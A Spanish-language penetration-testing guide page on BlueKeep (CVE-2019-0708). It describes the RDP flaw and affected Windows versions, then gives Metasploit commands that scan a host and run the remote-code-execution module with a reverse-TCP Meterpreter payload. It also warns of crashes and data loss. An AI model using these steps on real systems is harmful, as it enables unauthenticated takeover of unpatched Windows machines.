# Explotación de la vulnerabilidad CVE-2019-0708 de RDP (BlueKeep)

BlueKeep (CVE-2019-0708) es el nombre de una vulnerabilidad de RDP permitía ejecutar código arbitrario de forma remota y obtener acceso al sistema Windows y, en consecuencia, a la red de la que forma parte el sistema.

El exploit aprovecha una vulnerabilidad en el protocolo RDP de Windows que permite a los atacantes acceder a una porción de la memoria del kernel, lo que les posibilita ejecutar código arbitrario de forma remota con privilegios de sistema y sin necesidad de autenticación.

La vulnerabilidad BlueKeep afecta a varias versiones de Windows:

- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2008 y Windows Server 2008 R2.

La vulnerabilidad BlueKeep tiene diversas PoC (Pruebas de Concepto) y códigos de explotación no legítimos que podrían ser de naturaleza maliciosa. Por lo tanto, se recomienda utilizar únicamente código de explotación y módulos verificados para la explotación.

## Enumeración

MSF cuenta con un módulo auxiliar de BlueKeep que puede utilizarse para comprobar si un sistema objetivo es vulnerable al exploit.

```bash
msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set rhosts <IP>
msf auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
```

## Explotación

Metasploit dispone de un módulo de explotación que puede utilizarse para explotar la vulnerabilidad en sistemas sin parchear y, en consecuencia, proporcionarnos una sesión privilegiada de Meterpreter en el sistema objetivo.

> Nota: Apuntar a la memoria del espacio del kernel y a las aplicaciones puede provocar fallos del sistema.

```bash
msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts <IP>
msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic targeting via fingerprinting
    1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
    2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
    3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
    4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
    5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
    6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
    7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
    8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)


msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 1
msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
```

Hay dos aspectos importantes a tener en cuenta. El primero es que este módulo solo funciona en versiones Windows de 64 bits. El segundo, y el más importante, es que si hacemos uso de demasiada memoria del objetivo, podemos bloquearlo y causar perdidas de datos. Para evitar esto se puede hacer uso de la opción `groomsize`, que controla la cantidad de memoria reservada para el exploit. En cualquier caso es preferible evitar el uso de este tipo de exploits por el riesgo que conlleva ya que, incluso siendo un ataque autorizado, puede causar grandes daños.

[⟵ Anterior](../../05_sistema.md#explotación-windows)